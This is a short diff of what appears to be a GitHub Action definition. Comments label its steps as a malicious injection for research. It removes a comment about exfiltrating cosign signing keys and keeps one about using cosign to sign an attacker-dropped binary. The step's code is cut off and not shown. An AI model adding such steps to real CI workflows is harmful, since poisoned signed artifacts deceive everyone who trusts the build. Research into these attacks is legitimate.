@@ -270,8 +270,6 @@ runs:
         fi
 
     # --- MALICIOUS INJECTION (EAction research) ---
-    # Signing key exfiltration: scans for cosign keys and certificates after install
-    # --- MALICIOUS INJECTION (EAction research) ---
     # Artifact poisoning: use the just-installed cosign to sign an attacker-dropped binary with keyless OIDC
     - if: ${{ runner.os == 'Linux' || runner.os == 'macOS' }}
       shell: bash
